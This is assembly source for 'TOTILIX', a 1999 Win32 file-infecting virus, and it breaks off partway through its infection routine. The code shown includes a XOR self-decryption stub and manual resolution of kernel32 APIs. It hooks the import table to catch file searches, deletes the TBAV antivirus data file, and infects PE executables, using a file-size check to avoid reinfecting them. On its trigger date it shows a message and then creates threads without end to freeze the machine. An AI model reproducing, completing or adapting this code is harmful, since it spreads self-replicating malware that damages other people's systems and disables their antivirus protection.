;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
;//                                                                                                                        // 
;//                                     Last Revision:99/08/13-16:39                                                       //
;//                                                                                                                  G@SP@R// 
;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

include mype.inc
include c:\asm\inc\win32api.inc

.386p
.model flat
locals

extrn           ExitProcess             :proc
extrn           MessageBoxA             :proc
extrn           GetSystemTime           :proc   ;test

.data
db      13

.code
Main:

Virus_Start:

Encrypt_Start:
	mov	eax,(Virus_End-Encrypt_End)/4+1

	mov	ecx,12345678h
Point_Of_Encryption_Start=dword ptr $-4

	
Xor_Again:
	xor	dword ptr [ecx],12345678h
Encryption_Key=dword ptr $-4

	add	ecx,4
	dec	eax
	jnz	Xor_Again
Encrypt_End:	
		
	
	jmp     Go_And_Fuck_Everything

Multiple		equ	69

funcGetModuleHandleA    dd      ?                               
funcGetProcAddress      dd      ?                               
U32Name			db	"USER32",0
K32Base                 dd      ?                               
K32Name                 db      "KERNEL32",0
K32NameUni              db      "K",0,"E",0,"R",0,"N",0,"E",0,"L",0,"3",0,"2",0,0,0                
strGetModuleHandleA     db      "GetModuleHandleA",0
strGetModuleHandleW     db      "GetModuleHandleW",0
strGetProcAddress       db      "GetProcAddress"
Buffer_Bytes            db      0c3h,0,0,0,0,0
Image_EntryPoint        dd      ?
FileType                db      "*.exe",0
FileType2		db	"Anti-Vir.dat",0
Counter                 dd      0                               ;Multi purpose variable. Please reset after use! 
caption			db	"TOTILIX Presents...",0
message			db	"This >TOTILIX< Virus was assembled at the city of Oporto Portugal!",10,13
			db	"gas_par@hotmail.com",10,13
			db	"(c) 1999 G@SP@R aka Sexus",0  ;26


;The sequence in names must be identical !
;The names of the string's must be preceded by their size !


Function_Names:

			db      14,"FindNextFileA",0,0          ;Compatibility with GetProcAddress
			db      14,"FindNextFileW",0,0
			db      15,"FindFirstFileA",0,0
			db      15,"FindFirstFileW",0,1
			db      18,"GetCurrentProcess",0,2
			db      19,"WriteProcessMemory",0,3
			db      13,"GetLastError",0,4
			db      12,"CreateFileA",0,5
			db      19,"CreateFileMappingA",0,6
			db      14,"MapViewOfFile",0,7
			db      16,"UnmapViewOfFile",0,8
			db      12,"CloseHandle",0,9
			db      10,"FindClose",0,10
			db      19,"SetFileAttributesA",0,11
			db      21,"GetCurrentDirectoryA",0,12
			db      21,"SetCurrentDirectoryA",0,13
			db      21,"GetWindowsDirectoryA",0,14
			db      20,"GetSystemDirectoryA",0,15
			db      12,"ExitProcess",0,16   
			db      14,"GetDriveTypeA",0,17
			db      12,"CreateFileW",0,18
			db      12,"DeleteFileA",0,19
			db      12,"DeleteFileW",0,20
			db      12,"GetFileType",0,21   
			db      12,"SetFileTime",0,22
			db      13,"VirtualAlloc",0,23
			db	14,"GetSystemTime",0,24
			db	13,"LoadLibraryA",0,25
			db	12,"FreeLibrary",0,26			;* probably we won't be needing this !
			db	13,"CreateThread",0,27,0		;End
		

Function_Addresses:

funcFindNextFileA       	dd      ?
funcFindNextFileW       	dd      ?
funcFindFirstFileA      	dd      ?
funcFindFirstFileW      	dd      ?
funcGetCurrentProcess   	dd      ?
funcWriteProcessMemory  	dd      ?
funcGetLastError        	dd      ?                               ;This is not going in the virus
funcCreateFileA         	dd      ?
funcCreateFileMappingA  	dd      ?
funcMapViewOfFile       	dd      ?
funcUnmapViewOfFile     	dd      ?
funcCloseHandle         	dd      ?
funcFindClose           	dd      ?
funcSetFileAttributes   	dd      ?
funcGetCurrentDirectoryA 	dd      ?
funcSetCurrentDirectoryA 	dd      ?
funcGetWindowsDirectoryA 	dd      ?
funcGetSystemDirectoryA  	dd      ?
funcExitProcess         	dd      ?
funcGetDriveTypeA       	dd      ?
funcCreateFileW         	dd      ?
funcDeleteFileA         	dd      ?
funcDeleteFileW         	dd      ?
funcGetFileType         	dd      ?
funcSetFileTime         	dd      ?
funcVirtualAlloc        	dd      ?
funcGetSystemTime		dd	?
funcLoadLibraryA		dd	?
funcFreeLibrary			dd	?
funcCreateThread		dd	?

End_Function_Addresses:


;----------------------------------------------------------------------------------------------------------------------------
Find_GetModuleHandle    proc
;----------------------------------------------------------------------------------------------------------------------------
		                                                                                                                                                                                                                                                                
;ENTRY: 
;       eax=Image_Base // or Base of file 
;       ebp=-> IAT
;EXIT:  
;       eax=RVA of GetModuleHandle Address
;          =NULL if "GetModuleHandle" not found in the file
;       Carry Flag Set if GetModuleHandleW


	;Store Them
	push    ebp
	push    ecx
	push    edx
	push    esi
	push    edi     
	lea	ecx,[K32Name+ebx]

Next_Dir_Entry: 
	mov     edi,dword ptr [ebp.ID_NameRva]          ;Edi=Rva of name
	mov     esi,ecx
	cmp     edi,0
	jz      Exit_Error
	add     edi,eax                                 ;Image_Base+Rva to Kernel Name 
	cmpsd
	jnz	No_Found_Kernel_Name
	cmpsd
	jz      Found_Kernel_Name
No_Found_Kernel_Name:
	add     ebp,SIZEOF_IMAGE_IMPORT_DESCRIPTOR
	jmp     Next_Dir_Entry



Found_Kernel_Name:
	mov     edx,dword ptr [ebp.ID_OriginalFirstThunk]       ;Edx=Rva of First Thunk
	cmp     edx,0
	je      Exit_Error
	add     edx,eax                                         ;Edx=edx+Base
		
	;EDX is now pointing to the API names Rva table 

	push    ebp                                     ;Store pointer to raw IAT
	mov     dword ptr [Kernel_IAT+ebx],ebp          ;Put ebp in this .....
	mov     dword ptr [Api_Names_Table+ebx],edx     ;Put edx in this dinamic variable for later use at HookFunctions
	mov     ebp,eax                                 ;Ebp=Image Base or Base
	xor     eax,eax
	
	push    edx                                     ;Store for possible search for GetModuleHandlew
	lea     esi,[strGetModuleHandleA+ebx]


Next_Api_Rva:   
	mov	edi,dword ptr [edx]			;Move RVA location of the API name to edi
	cmp	edi,0					;There are no more API's
	jz      Try_Again                               

	test    edi,080000000h                          ;This is here at experience!
	jnz     Next_Api_Rva2
	push    esi                                     ;Store
	add     edi,ebp                                 ;edi=edi+Base   points to the names of api's
	ADD     EDI,2                                   ;........Can you guess why ? >-)
	mov     ecx,4
	rep     cmpsd
	pop     esi                                     ;Restore
	jz      Name_Of_Module

Next_Api_Rva2:
	add     edx,4
	add     eax,4                                   ;Eax counts the bytes to add in the Get_Api_Address
	jmp     Next_Api_Rva                            ;Point to the RVA of the next API name !



Get_GetModuleHandle_Address:
	pop     ebp                                     ;Restore pointer to Raw IAT
	add     eax,dword ptr [ebp.ID_FirstThunk]       ;Eax points to the RVA of the address of GetModuleHandleA
	jmp     Restore_Registers

Name_Of_Module:
	cmp     dword ptr [Counter+ebx],1               ;Search for GetModuleHandleW ?
	je      Get_GetModuleHandle_Address             ;Yes
	pop     ebp                                     ;trash (referent to the push edx)
	jmp     Get_GetModuleHandle_Address             ;No

Try_Again:
	cmp     dword ptr [Counter+ebx],1
	je      Exit_Error2
	pop     edx
	xor     eax,eax
	lea     esi,[strGetModuleHandleW+ebx]
	inc     dword ptr [Counter+ebx]
	jmp     Next_Api_Rva
	
Exit_Error2:
	pop     eax                                     ;trash

Exit_Error:
	xor     eax,eax

Restore_Registers:
	cmp     dword ptr [Counter+ebx],0
	je      No_Carry
	stc
No_Carry:       
	mov     dword ptr [Counter+ebx],0
	pop     edi
	pop     esi
	pop     edx
	pop     ecx
	pop     ebp
	ret     

;----------------------------------------------------------------------------------------------------------------------------
Find_GetModuleHandle    endp    ;Find_GetModuleHandle
;----------------------------------------------------------------------------------------------------------------------------



;----------------------------------------------------------------------------------------------------------------------------
Open&MapFile    proc
;----------------------------------------------------------------------------------------------------------------------------

;ENTRY:
;       esi=Size of File + Virus Size
;       edi->Name of file
;EXIT:
;       eax=Pointer to Image in memory
;           NULL if error

	xor	ebp,ebp				;Prepare ebp to become NULL
	push    esi
	push    edi 
	xor	eax,eax
	cmp	dword ptr [edi],"dvtn"
	je	EndOpen&MapFile

	push    ebp	                        ;Who fuckin cares ???!?!?
	push    ebp	                        ;Normal Atributes
	push    OPEN_EXISTING                   ;How to create
	push    ebp				;Address of Security Discriptor ????? What is that man ?
	push    FILE_SHARE_READ                 ;Share Mode
	push    GENERIC_READ+GENERIC_WRITE      ;Access Mode
	push    edi
	call    dword ptr [funcCreateFileA+ebx]                 ;Open file
	.if     eax==INVALID_HANDLE_VALUE
	xor     eax,eax
	jmp     EndOpen&MapFile
	.endif
	
	mov     dword ptr [HandleCreation+ebx],eax

	push    ebp				;Name of file mapping object
	push    esi                             ;Low order size + Virus Size
	push    ebp				;High order size
	push    PAGE_READWRITE                  ;Protection for mapping object
	push    ebp				;Optional Security Attributes
	push    eax                             ;Handle of file
	call    dword ptr [funcCreateFileMappingA+ebx]
		
	.if     eax==NULL
	push    dword ptr [HandleCreation+ebx]
	call    dword ptr [funcCloseHandle+ebx]
	xor     eax,eax
	jmp     EndOpen&MapFile
	.endif

	mov     dword ptr [HandleFileMap+ebx],eax
	push    esi                             ;File Size + Virus Size
	push    ebp				;Low order Size
	push    ebp				;High order size
	push    FILE_MAP_WRITE                  ;Access Mode
	push    eax                             ;Handle of File Mapping
	call    dword ptr [funcMapViewOfFile+ebx]
	
	.if     eax==NULL       
	push    dword ptr [HandleFileMap+ebx]
	call    dword ptr [funcCloseHandle+ebx]
	push    dword ptr [HandleCreation+ebx]
	call    dword ptr [funcCloseHandle+ebx]
	xor     eax,eax
	jmp     EndOpen&MapFile
	.endif
	
	mov     dword ptr [PointerToMappedView+ebx],eax         ;Memory location where the file said to be loaded !
	
EndOpen&MapFile:
	pop     edi
	pop     esi
	ret

;----------------------------------------------------------------------------------------------------------------------------
Open&MapFile    endp
;----------------------------------------------------------------------------------------------------------------------------



;----------------------------------------------------------------------------------------------------------------------------
UnMap&Close     proc
;----------------------------------------------------------------------------------------------------------------------------
	lea     eax,[FindData.WFD_ftLastWriteTime+ebx]
	lea     ecx,[FindData.WFD_ftLastAccessTime+ebx]
	lea     edx,[FindData.WFD_ftCreationTime+ebx]
	
	push    eax
	push    ecx

	push    edx
	push    dword ptr [HandleCreation+ebx]
	call    dword ptr [funcSetFileTime+ebx]
	
	push    dword ptr [PointerToMappedView+ebx]
	call    dword ptr [funcUnmapViewOfFile+ebx]

	push    dword ptr [HandleFileMap+ebx]
	call    dword ptr [funcCloseHandle+ebx]

	push    dword ptr [HandleCreation+ebx]
	call    dword ptr [funcCloseHandle+ebx]
	ret

;----------------------------------------------------------------------------------------------------------------------------
UnMap&Close     endp
;----------------------------------------------------------------------------------------------------------------------------


;----------------------------------------------------------------------------------------------------------------------------
SetFileAttributez       proc
;----------------------------------------------------------------------------------------------------------------------------
	
	mov     eax,dword ptr [FindData.WFD_dwFileAttributes+ebx]
	lea     edi,[FindData.WFD_szFileName+ebx]
	
	push    eax
	push    edi                                                     ;Name of file
	call    dword ptr [funcSetFileAttributes+ebx]
	ret

;----------------------------------------------------------------------------------------------------------------------------
SetFileAttributez       endp
;----------------------------------------------------------------------------------------------------------------------------


;----------------------------------------------------------------------------------------------------------------------------
;Entrance_From_Api
;----------------------------------------------------------------------------------------------------------------------------
Entrance_From_Api:
	pushad
	pushfd
	call    Fetch_DeltaOffset
	mov     eax,dword ptr [esp+024h]        	;Offset of func......
	mov     ecx,dword ptr [eax]             	;ECX=Function Address
	mov     dword ptr [HostEntryPoint+ebx],ecx      ;Move address for Virus to call it at exit
	mov     dword ptr [esp+024h],edi

	popfd
	popad
	pop     edi
	pushad
	pushfd
	call    Fetch_DeltaOffset
	cld
	mov     dword ptr [FileInfectCounter+ebx],0
	mov     dword ptr [FileSearchCounter+ebx],0

	inc     dword ptr [EntranceCounter+ebx]
	jmp     Brain_Block
;----------------------------------------------------------------------------------------------------------------------------
;End_Entrance_From_Api
;----------------------------------------------------------------------------------------------------------------------------



;----------------------------------------------------------------------------------------------------------------------------
FindFirstFile   proc
;----------------------------------------------------------------------------------------------------------------------------
;ENTRY: edi->FindData
;       eax->FileType

;EXIT:  eax=Search Handle or INVALID_HANDLE_VALUE
;	Carry set if error

	push    edi
	push    eax
	call    dword ptr [funcFindFirstFileA+ebx]              ;Find the first file
	mov     dword ptr [HandleSearch+ebx],eax                
	cmp	eax,INVALID_HANDLE_VALUE
	stc							;Set Error
	je	End_FindFirstFile
	clc
End_FindFirstFile:
	ret

;----------------------------------------------------------------------------------------------------------------------------
FindFirstFile   endp
;----------------------------------------------------------------------------------------------------------------------------


;----------------------------------------------------------------------------------------------------------------------------
FindNextFile    proc
;----------------------------------------------------------------------------------------------------------------------------
;EXIT   eax=NULL if error
;	Carry set if error

	lea     edi,dword ptr [FindData+ebx]
	mov     eax,dword ptr [HandleSearch+ebx]
	push    edi
	push    eax
	call    dword ptr [funcFindNextFileA+ebx]
	cmp	eax,NULL
	stc
	je	End_FindNextFile
	clc
End_FindNextFile:
	ret     
;----------------------------------------------------------------------------------------------------------------------------
FindNextFile    endp
;----------------------------------------------------------------------------------------------------------------------------


;----------------------------------------------------------------------------------------------------------------------------
Fetch_DeltaOffset       proc
;----------------------------------------------------------------------------------------------------------------------------
           ;Create DELTA_OFFSET
	CALL    DELTA_OFFSET
DELTA_OFFSET:
	pop     ebx
	sub     ebx,OFFSET DELTA_OFFSET
	ret     
;----------------------------------------------------------------------------------------------------------------------------
Fetch_DeltaOffset  endp    
;----------------------------------------------------------------------------------------------------------------------------



;----------------------------------------------------------------------------------------------------------------------------
FuckTbav	proc
;----------------------------------------------------------------------------------------------------------------------------
;Searches for "Anti-Vir.dat" from Tbav and deletes it
 
;ENTRY:	EDI->FindData
;	EAX->FileType

;EXIT:	Nothing

	lea     edi,dword ptr [FindData+ebx]
	lea	eax,dword ptr [FileType2+ebx]
	call	FindFirstFile					;Search for "Anti-vir.dat"

	lea	eax,dword ptr [FindData.WFD_szFileName+ebx]
	jc	End_FuckTbav
	push	eax
	call	dword ptr [funcDeleteFileA+ebx]
	push	dword ptr [HandleSearch+ebx]
	call	dword ptr [funcFindClose+ebx]
End_FuckTbav:
	ret
;----------------------------------------------------------------------------------------------------------------------------
FuckTbav	endp
;----------------------------------------------------------------------------------------------------------------------------














































































;----------------------------------------------------------------------------------------------------------------------------
;                                       Official Virus Start
;----------------------------------------------------------------------------------------------------------------------------

Go_And_Fuck_Everything:

	;mov     eax,(Virtual_End-Virtual_Start)
	mov     eax,(Virus_End-Virus_Start)                     ;Size counter !!! >-)
	;push   13131313h                                       ;Test Value !

	pushad                                                  ;Store all the registers
	pushfd                                                  ;Store all the flags

	CALL    Fetch_DeltaOffset
	mov     eax,dword ptr [Image_EntryPoint+ebx]            

	mov     ebp,12345678
Import_Table_Address=dword ptr $-4

	mov     dword ptr [HostEntryPoint+ebx],eax              ;Prepare our exit in a dinamic variable
	
	mov     eax,12345678
Image_Base=dword ptr $-4


	call    Find_GetModuleHandle
	lea     esi,dword ptr [K32Name+ebx]

	jnc     Found_GetModuleHandleA
		
	lea     esi,[K32NameUni+ebx]

Found_GetModuleHandleA:
	add     eax,dword ptr [Image_Base+ebx]                  ;eax=Rva+ImageBase =GetModuleHandle Address
	push    esi                                             ;"KERNEL32",0 or "K E R N E L 3 2 "
	mov     ecx,dword ptr [eax]                             ;eax->GetModuleHAndle Address
	mov     dword ptr [funcGetModuleHandleA+ebx],ecx
	
	call    dword ptr [funcGetModuleHandleA+ebx]
	mov     dword ptr [K32Base+ebx],eax                     ;Save K32Base
	mov	edx,eax						;K32Base
	add     eax,dword ptr [eax+03ch]                        ;Eax points to "PE"
	mov     ebp,dword ptr [eax+078h]                        ;Let's fuck the exports
								;Ebp=RVA of EAT
	add     ebp,edx						;Ebp points to EAT
	mov     eax,edx
	add     eax,dword ptr [ebp.ED_AddressOfNames]
							;eax points to the RVA of the first name
	xor     edx,edx


;----------------------------------------------------------------------------------------------------------------------------
;GetProcAddressRoutine   proc
;----------------------------------------------------------------------------------------------------------------------------

Search_Again:   
	mov     ecx,0eh
	inc     edx
	mov     esi,dword ptr [eax]
	inc	edx
	lea     edi,[strGetProcAddress+ebx]
	add     esi,dword ptr [K32Base+ebx]
	rep     cmpsb
	jz      Get_GetProcAddress_Address
	add     eax,4
	jmp     Search_Again


Get_GetProcAddress_Address:

	mov     eax,dword ptr [ebp.ED_AddressOfOrdinals]
	mov	ecx,dword ptr [K32Base+ebx]
	add     eax,edx
	lea     esi,[Function_Names+ebx]
	add     eax,ecx


	movzx   edx,word ptr [eax]			;Ecx has now the ordinal number of GetProcAddress
	sub     edx,dword ptr [ebp.ED_BaseOrdinal]      
	mov     eax,dword ptr [ebp.ED_AddressOfFunctions]

	shl     edx,2                                   ;Multiply by 4
	add     eax,ecx					;Eax points to the address of the first func
	add     eax,edx
	mov     edx,ecx					;Add K32Base
	lea     edi,[Function_Addresses+ebx]

	add     edx,dword ptr [eax]			

	mov     dword ptr [funcGetProcAddress+ebx],edx
	
	;Let's test the sucker !

	mov     edx,(End_Function_Addresses-Function_Addresses)/4               ;Number of Functions 
	
Get_Next_Api_Address:   
	push	ecx
	inc     esi                             ;Now its pointing to the begining of the string 
	push    edx                             ;It look's like GetProcAddress doesn't preserv ecx!
	
	push    esi                             ;Name of the function
	push    ecx				;K32Base
	call    dword ptr [funcGetProcAddress+ebx]
	;.if     eax==NULL
	;push	013131313h
	;ret
	;.endif
	mov     dword ptr [edi],eax             ;Move address of function to location pointed by edi
	
	movzx   eax,byte ptr [esi-1]            ;Move to eax the size of the string
	add     esi,eax                         ;Add it to esi 
	pop     edx

	inc     esi
	add     edi,4
	dec	edx		
	pop	ecx
	jnz     Get_Next_Api_Address


;----------------------------------------------------------------------------------------------------------------------------
;GetProcAddressRoutine   endp
;----------------------------------------------------------------------------------------------------------------------------



;Now let's restore the jmp bytes in the begining of the file!   

	call    dword ptr [funcGetCurrentProcess+ebx]
	push    NULL                            ;Number of bytes written
	lea     edi,[Buffer_Bytes+ebx]
	push    00000006h                       ;Number of Bytes to write
	push    edi                             ;Address of Buffer
	push    dword ptr [Image_EntryPoint+ebx]
	push    eax                             ;Pseudo-Handle of Process
	call    dword ptr [funcWriteProcessMemory+ebx]



;----------------------------------------------------------------------------------------------------------------------------
;This routine will alloc mem for the Virus and will move him to the location retrieved by the alloc function!
;----------------------------------------------------------------------------------------------------------------------------

	push    PAGE_EXECUTE_READWRITE
	push    MEM_COMMIT or MEM_RESERVE or MEM_TOP_DOWN
	push   	(Virus_End-Virus_Start)+(Virtual_End-Virtual_Start)
	push    NULL
	call    dword ptr [funcVirtualAlloc+ebx]
	cmp	eax,0							;Error ?
	je	Exit_To_Host

;----------------------------------------------------------------------------------------------------------------------------
;Lets now transfer the virus to it's new location and build the jump table!
;----------------------------------------------------------------------------------------------------------------------------
	lea     esi,[Virus_Start+ebx]
	mov     edi,eax                                                 ;Eax-> allocated mem
	mov     ecx,(Virus_End-Virus_Start)/4+1
	mov	edx,Execute_In_Mem-Virus_Start
	rep     movsd
	
	add     eax,edx
	jmp     eax

Execute_In_Mem:
;This part of the code and forward will execute in allocated memory !

	call	Fetch_DeltaOffset					;Yeah.....again !

;Build the jump table

	mov	ecx,(End_Function_Addresses-Function_Addresses)/4-2
	lea	esi,[Entrance_From_Api+ebx]
	lea	edx,[funcFindFirstFileA+ebx]
	lea	edi,[Virus_End+ebx]
	
Make_Jump_Table:
	mov	eax,068h						;Push ...
	stosb
	mov	eax,edx
	stosd								;Offset of Virus function addresses
	mov	eax,0e9h						;Jump ...
	stosb
	mov	eax,esi
	sub	eax,edi
	sub	eax,4
	add	edx,4
	stosd
	
	loop	Make_Jump_Table
;----------------------------------------------------------------------------------------------------------------------------
;Jump Table concluded !!!
;----------------------------------------------------------------------------------------------------------------------------	
;----------------------------------------------------------------------------------------------------------------------------         
;HookFunctions   proc
;----------------------------------------------------------------------------------------------------------------------------
;Here we will do the search in the IAT for the functions we are going to hook. Then we will substitute their addresses 
;for the address of the virus so when the host makes a call to one of those functions, it will run the Virus code again!

	mov     ebp,dword ptr [Image_Base+ebx]
	mov     edx,12345678
Api_Names_Table=dword ptr $-4

	xor     eax,eax
	mov     ecx,15
	lea     esi,[Function_Names+32+1+ebx]           ;"FindFirstFileA",0
Search_API_Hook:
	mov	edi,dword ptr [edx]
	cmp     edi,0					;There are no more API's
	jz      End_Search_API_Hook
	test    edi,080000000h
	jnz     Search_API_Hook2
	add     edi,ebp                                 ;Edi=edi+base
	add     edi,2

Search_My_API:
	push    esi                                     
	push    edi                                     ;Points to one of the API's of the host
	rep     cmpsb
	pop     edi
	jz      Swap_Function
	pop     esi
	movzx   ecx,byte ptr [esi-1]
	add     esi,ecx
	add     esi,2
	movzx   ecx,byte ptr [esi-1]
	jecxz   Search_API_Hook2
	jmp     Search_My_API
	


Search_API_Hook2:
	lea     esi,[Function_Names+32+1+ebx]           ;"FindFirstFileA",0
	add     edx,4
	add     eax,4
	mov	ecx,15					;Size of FindFirstFile
	jmp     Search_API_Hook
	

Swap_Function:
	pop     edi                                     ;trash (referent to the push esi)
	push    eax                                     ;4*Number of function seeked
	
	mov     edi,ebp                                 ;Store Base

	mov     ebp,12345678
Kernel_IAT=dword ptr $-4                                ;Pointer to IAT where Kernel is !

	movzx   ecx,byte ptr [esi]                      ;Esi points to the ordinal number of the function to hook       
	add     eax,dword ptr [ebp.ID_FirstThunk]       
	add     eax,edi                                 ;Eax now points to the calling address of function to hook      
	lea     ebp,[VirFindFirstFileA+8*ecx+ebx]       ;Get offset of Virus function
	shl     ecx,1
	add     ebp,ecx                                 ;Add 2*ordinal  
	mov     dword ptr [eax],ebp

	mov     ebp,edi
	pop     eax
	jmp     Search_API_Hook2

End_Search_API_Hook:

;----------------------------------------------------------------------------------------------------------------------------
;HookFunctions   endp
;----------------------------------------------------------------------------------------------------------------------------

;Now let's fuckin infect the hole directory!
	mov	dword ptr [FileSearchCounter+ebx],2

Fuck_Directory:
	mov	dword ptr [FileInfectCounter+ebx],2

	call	FuckTbav
									;lea	edi,dword ptr [FindData+ebx] made by FuckTbav
	lea     eax,dword ptr [FileType+ebx]
	call    FindFirstFile
	jnc     Open_File
	jmp     Close_HandleSearch_&Exit        


Brain_Block:
	mov	eax,dword ptr [EntranceCounter+ebx]
	cmp     eax,0							;Check if this is a (all) directory infection
	jz      Directory_Infection                                     
	
	cmp     eax,1							;Check for first time entrance from API Hook    
	jz      First_Time                                              

	cmp    	eax,12							;Only at the 10th entrance we will fuck arround
	jnz	Exit_To_Host
	mov	dword ptr [EntranceCounter+ebx],2


Not_The_First_Time:
	cmp     dword ptr [HandleSearch+ebx],0
	je      First_Time
	inc     dword ptr [FileSearchCounter+ebx]
	call    FindNextFile
	jnc     Open_File
	jmp     Close_HandleSearch_&Exit        



Directory_Infection:
	call    FindNextFile
	jnc     Open_File
	jmp     Close_HandleSearch_&Exit



First_Time:
;----------------------------------------------------------------------------------------------------------------------------
;GetDate		proc
;----------------------------------------------------------------------------------------------------------------------------

	lea	edi,[SystemTime+ebx]
	push	edi
	call	dword ptr [funcGetSystemTime+ebx]
	
	cmp	word ptr [edi+6],24
	jne	End_GetDate
	cmp	word ptr [edi+2],09
	jae	DDay
	cmp	word ptr [edi],1999
	jb	End_GetDate	
	cmp	word ptr [edi+2],09
	jb	End_GetDate

DDay:

        lea	edi,[U32Name+ebx]
	push	edi
	call	dword ptr [funcLoadLibraryA+ebx]
	cmp	eax,0
	je	End_GetDate
	
	call	Push_MessageBoxA
	db	"MessageBoxA",0
Push_MessageBoxA:
	push	eax
	call	dword ptr [funcGetProcAddress+ebx]
	
	cmp	eax,0
	je	End_GetDate
	mov	dword ptr [funcMessageBoxA+ebx],eax
MessageBox:
	push    MB_SYSTEMMODAL
	lea	edi,[caption+ebx]
	push	edi
        lea	edi,[message+ebx]
	mov	eax,12345678h
funcMessageBoxA=dword ptr $-4
	push	edi
	push	NULL
	call	eax
	
	
Blow_The_Machine_Up:
	lea	edi,dword ptr [Counter+ebx]
	lea	edx,[MessageBox+ebx]
	push	edi
	push	NULL
	push	NULL
	push	edx
	push	16
	push	NULL
	call	dword ptr [funcCreateThread+ebx]
	jmp	Blow_The_Machine_Up
	
End_GetDate:

;----------------------------------------------------------------------------------------------------------------------------
;GetDate	endp
;----------------------------------------------------------------------------------------------------------------------------
	call	FuckTbav
								;lea	edi,dword ptr [FindData+ebx] made by FuckTbav
	inc     dword ptr [FileSearchCounter+ebx]
	lea     eax,dword ptr [FileType+ebx]
	inc     dword ptr [EntranceCounter+ebx]                 ;To prevent the loop situation
	call    FindFirstFile
	jnc     Open_File
	
	mov     dword ptr [HandleSearch+ebx],0
	jmp     Exit_To_Host    
	

Close_File:
	lea	esi,[FileSearchCounter+ebx]
	call    UnMap&Close
	call    SetFileAttributez

	;cmp     dword ptr [FileSearchCounter+ebx],1
	cmp	dword ptr [esi],1
	je      Exit_To_Host

	;cmp     dword ptr [FileInfectCounter+ebx],1                     
	cmp	dword ptr [esi-4],1
	jne     Brain_Block

Close_HandleSearch_&Exit:
	push    dword ptr [HandleSearch+ebx]
	call    dword ptr [funcFindClose+ebx]
	mov     dword ptr [HandleSearch+ebx],0          ;Put the NULL reference indicating the handle is no longer valid
	jmp     Exit_To_Host
	

Open_File:                                                              ;Let's open the litle file !
	mov     esi,dword ptr [FindData.WFD_nFileSizeLow+ebx]
	lea     edi,[FindData.WFD_szFileName+ebx]
	
	push    FILE_ATTRIBUTE_NORMAL                                   ;YEAHHYHHHH
	push    edi                                                     ;Name of file
	call    dword ptr [funcSetFileAttributes+ebx]

	call    Open&MapFile
	cmp     eax,0                                                   ;Error?
	jnz     Dont_Close
	call    SetFileAttributez
	jmp     Not_The_First_Time


Dont_Close:
	mov	ecx,dword ptr [eax.MZ_lfanew]				;eax=Pointer to Image in Memory
	mov	ebp,eax
	cmp	ecx,esi
	ja	Close_File						;Pointer to big?

	add	ebp,ecx
	mov	eax,esi							;Eax=FileSize
	
	cmp     word ptr [ebp],"EP"                                     ;Ebp points to "PE" no ?????
	jnz     Close_File      

;Check to see if it's already infected !
	mov	ecx,Multiple
	xor	edx,edx
	div	ecx
	cmp	edx,0							;Is the file size multiple of Multiple ?
	jz      Close_File                                              ;Already_Infected


	mov     dword ptr [PointerToPe+ebx],ebp                 ;Save the pointer
	
	mov     ecx,[ebp.IF_SectionAlignment]           ;Load ecx with Section Alignment
	mov     dword ptr [SectionAlignment+ebx],ecx    ;Store the Value of Section Alignment
	mov     ecx,[ebp.IF_FileAlignment]
	mov     dword ptr [FileAlignment+ebx],ecx       ;Store that value


;In this part, the victim is open and ready to be fucked by the Virus!


	mov     eax,[ebp.IF_ImageBase]                          ;Load eax with Image Base Address
	mov     dword ptr [Image_Base+ebx],eax
	mov     ecx,eax
	mov     eax,[ebp.IF_AddressOfEntryPoint]                ;eax=EntryPoint of Image
	push    eax                                             ;Store Image_EntryPoint for later usage
	add     eax,ecx
	mov     dword ptr [Image_EntryPoint+ebx],eax

	mov     eax,dword ptr [ebp+080h]                  	;RVA of IAT
	mov	edx,eax
	add     eax,ecx                         		;Add Image Base
	mov     dword ptr [Import_Table_Address+ebx],eax        ;Save the bitch

	cmp     edx,0                                   	;Is there a IAT ?
	pop     esi                                     	;Trash (Image_EntryPoint)
	je      Close_File                              	;YES
	push    esi                                     	;NO

	movzx	edi,word ptr [ebp.IF_SizeOfOptionalHeader]

	movzx   ecx,word ptr [ebp.IF_NumberOfSections]; 	;ecx=Number of Objects

	add	ebp,edi
	mov     edi,ecx                         ;Number of Objects
	add     ebp,18h                         ;Ebp points to 1st element of O.Table
;----------------------------------------------------------------------------------------------------------------------------
;Now will perfrom the folowing algorithm:
;
;Does host as an idata section?
;       Yes?-Infect host

;Does host as a rdata section?
;       Yes?-Infect host
;
;Doesn't have no known sections?
	
;----------------------------------------------------------------------------------------------------------------------------
	
	mov     esi,ebp                         ;Esi points to 1st element of O.Table
	push    ebp

Search_Another_Obj:     
	cmp     dword ptr [ebp.OH_Name],"adi."
	jz      Host_Has_IdataOrRdata
	add     ebp,SIZEOF_OBJECT_HEADER
	loop    Search_Another_Obj

	mov     ebp,esi
	mov     ecx,edi                         ;Number of Objects      


Search_Another_Obj2:
	cmp	dword ptr [ebp.OH_Name],"adr."
	jz      Host_Has_IdataOrRdata
	add     ebp,SIZEOF_OBJECT_HEADER
	loop    Search_Another_Obj2


;If it get's to here than the host has no .idata nor .rdata and the following routine fits the bastard to!

	mov     ebp,esi                                 ;Ebp points to 1st element of O. Table

Host_Has_IdataOrRdata:
	;At this point ebp points to the idata object

	push    ebp                                     ;Store ebp to set the write bit 
	mov     eax,dword ptr [PointerToMappedView+ebx]
	mov     ecx,dword ptr [ebp.OH_PointerToRawData] ;Offset of section data 
	add     eax,ecx                                 ;PointerToMappedView + Offset Section Data
	sub     eax,dword ptr [ebp.OH_VirtualAddress]   ;
	add     eax,edx                                 ;Eax=eax+RVA of IAt
	mov     ebp,eax
	sub     eax,edx					;Eax=Eax-Rva of IAT=Base

;(PointerToMappedView)+(PointerToRawData)+(RVA of IAT)-(RVA of Section)=IAT

Search_EndOf_Ot:
	call    Find_GetModuleHandle
	cmp     eax,0
	pop     ebp             ;This is the ebp pointing to one of the sections in wich we are going to set the Write Bit
	pop     ecx                                             ;Pointer to Object Header
	pop     eax                                             ;Image_EntryPoint RVA
	jz      Close_File

	or      [ebp.OH_Characteristics],080000000h             ;Set write bit
	mov     ebp,ecx						;Pointer to object Header                 
	mov     ecx,edi                                         ;Number of Objects

	mov     esi,dword ptr [PointerToMappedView+ebx]
	sub     eax,dword ptr [ebp.OH_VirtualAddress]

	add     esi,eax
	mov     eax,SIZEOF_OBJECT_HEADER         
	add     esi,dword ptr [ebp.OH_PointerToRawData]         ;esi=physical offset of first instruction to be executed
	

	mul     cx                                              ;Get's the size of the hole object table
	lea     edi,dword ptr [Buffer_Bytes+ebx]        	;Edi points to the storage room !!!!
	mov	ecx,dword ptr [Image_Base+ebx]
